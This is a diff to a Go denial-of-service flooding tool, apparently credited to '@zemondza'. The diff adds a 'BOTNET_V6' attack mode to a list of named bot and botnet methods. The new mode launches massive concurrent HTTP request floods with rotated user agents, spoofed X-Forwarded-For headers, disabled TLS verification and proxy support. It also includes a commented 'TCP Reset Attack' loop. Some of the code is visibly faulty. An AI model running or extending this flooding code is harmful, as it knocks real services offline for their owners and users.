@@ -12,6 +12,7 @@ import (
 	"time"
 	"crypto/tls"
 	"flag"
+	"net"
 	"math/rand"
 )
 
@@ -91,7 +92,7 @@ var (
 
 func init() {
 	flag.StringVar(&urlString, "u", "", "url")
-	flag.StringVar(&method, "m", "GET PUT DELETE PATCH POST SLOW LOW HTTPS POWERSLOW  ULTRAPOWERSLOW ULTRAHTTPS ULTRAPING HTTPS2  ANTIDDOS далі йдуть боти (BOTDDOS ANTIDDOSBOT SUPERBOT SLOWLORISBOT SUPERULTIMATEBOT) Дальше ботнети (BOTNET_V2 BOTNET_V1 BOTNET_V4) Програму зробив @zemondza ", "method")
+	flag.StringVar(&method, "m", "GET PUT DELETE PATCH POST SLOW LOW HTTPS POWERSLOW  ULTRAPOWERSLOW ULTRAHTTPS ULTRAPING HTTPS2  ANTIDDOS далі йдуть боти (BOTDDOS ANTIDDOSBOT SUPERBOT SLOWLORISBOT SUPERULTIMATEBOT) Дальше ботнети (BOTNET_V2 BOTNET_V1 BOTNET_V4 BOTNET_V6 ) Програму зробив @zemondza ", "method")
 	flag.StringVar(&proxies, "p", "", "proxies")
 	flag.DurationVar(&timeout, "t", 5*time.Second, "timeout")
 	flag.BoolVar(&allow_redirects, "r", false, "allow redirects")
@@ -1433,10 +1434,10 @@ for i := 0; i < max_requests_global*16000; i++ {
 		}
 	}(i)
 }
-case "BOTNET_V4":
+	case "BOTNET_V4":
 	data := []byte(`{"foo":"bar"}`)
-	contentLength := len(data)
 	chunkSize := 16384
+	contentLength := len(data) // Додали ініціалізацію contentLength
 	for i := 0; i < max_requests_global*20000; i++ {
 		wg.Add(1)
 		go func(i int) {
@@ -1491,22 +1492,134 @@ case "BOTNET_V4":
 				}
 				start := time.Now()
 				resp, err := bot.Do(req)
+				// Додай обробку відповіді і постав додаткових запитів
 				if err != nil {
 					log.Printf("Error: %v", err)
 				} else {
 					defer resp.Body.Close()
-					elapsed := time.Since(start)
-					fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
+					if resp.StatusCode == http.StatusOK {
+						// Додавання додаткових запитів на сервер
+						req, err := http.NewRequest(method, urlString, nil)
+						if err != nil { // Обробка помилки, якщо вона виникає при ініціалізації req
+							log.Printf("Error: %v", err)
+						} else {
+							req.Header.Set("Content-Type", "application/json")
+							bot.Do(req)
+						}
+						
+						elapsed := time.Since(start)
+						fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
+					}
 				}
 			}
 		}(i)
 	}
-	wg.Wait()
+	case "BOTNET_V6":
+	data := []byte(`{"foo":"bar"}`)
+	chunkSize := 16384
+	contentLength := len(data)
+	for i := 0; i < max_requests_global*20000; i++ {
+		wg.Add(1)
+		go func(i int) {
+			defer wg.Done()
+			key := fmt.Sprintf("%s:%s:%t", urlString, method, allow_redirects)
+			mutex.Lock()
+			cache[key]++
+			mutex.Unlock()
+			req, err := http.NewRequest(method, urlString, nil)
+			if err != nil {
+				log.Fatalln(err)
+			}
+			req.Header.Set("Content-Type", "application/json")
+			if proxies != "" {
+				proxyURL, err := url.ParseRequestURI(proxies)
+				if err != nil {
+					log.Fatalln(err)
+				}
+				transport := &http.Transport{Proxy: http.ProxyURL(proxyURL)}
+				client.Transport = transport
+			}
+			rand.Seed(time.Now().UnixNano())
+			req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
+			req.URL.Scheme = "https"
+			chunkSize = rand.Intn(8-4+1)*1024 + 16384
+			for j := 0; j < contentLength; j += chunkSize {
+				end := j + chunkSize
+				if end > contentLength {
+					end = contentLength
+				}
+				chunk := data[j:end]
+				if i%2 == 0 {
+					buf := make([]byte, 1024)
+					req.Body = ioutil.NopCloser(bytes.NewReader(buf))
+				} else {
+					req.Body = ioutil.NopCloser(bytes.NewReader(chunk))
+					req.ContentLength = int64(len(chunk))
+				}
+				bot := &http.Client{
+					Timeout: time.Second * 60,
+					Transport: &http.Transport{
+						MaxIdleConns:        500,
+						MaxIdleConnsPerHost: 500,
+						IdleConnTimeout:     600 * time.Second,
+						TLSClientConfig: &tls.Config{
+							InsecureSkipVerify: true,
+							MaxVersion:         tls.VersionTLS12,
+							MinVersion:         tls.VersionTLS10,
+						},
+					},
+				}
+				req.Header.Set("X-Protocol-Level", "2")
+				start := time.Now()
+				resp, err := bot.Do(req)
+				if err != nil {
+					log.Printf("Error: %v", err)
+				} else {
+					defer resp.Body.Close()
+					if resp.StatusCode == http.StatusOK {
+						req, err := http.NewRequest(method, urlString, nil)
+						if err != nil {
+							log.Printf("Error: %v", err)
+						} else {
+							req.Header.Set("Content-Type", "application/json")
+							if i%2 == 0 {
+								req.Header.Set("X-Forwarded-For", "10.0.0.1")
+							} else {
+								req.Header.Set("X-Forwarded-For", "9.0.0.1")
+							}
+							req.Header.Set("X-Protocol-Level", "3")
+							bot.Do(req)
+						}
+						elapsed := time.Since(start)
+						fmt.Printf("[%d][%d] %s in %v\n", os.Getpid(), i+1, resp.Status, elapsed)
+					}
+				}
 
+				// Додай TCP Reset Attack
+				if i%2 == 1 {
+					conn, err := net.Dial("tcp", "127.0.0.1:80")
+					if err != nil {
+						log.Printf("Error: %v", err)
+					}
+					conn.(*net.TCPConn).SetLinger(0)
+					go func() {
+						for {
+							for i := 0; i < 6; i++ {
+								duration := time.Second * time.Duration(rand.Intn(25)+1)
+								time.Sleep(duration)
+								conn.Write([]byte("HEAD / HTTP/1.0\r\n\r\n"))
+								conn.(*net.TCPConn).SetLinger(0)
+							}
+							time.Sleep(2 * time.Second)
+						}
+					}()
+				}
+			}
+		}(i)
+	}
 	default:
 		log.Fatalln("Invalid HTTP method")
 	}
 
 	wg.Wait()
 }
-
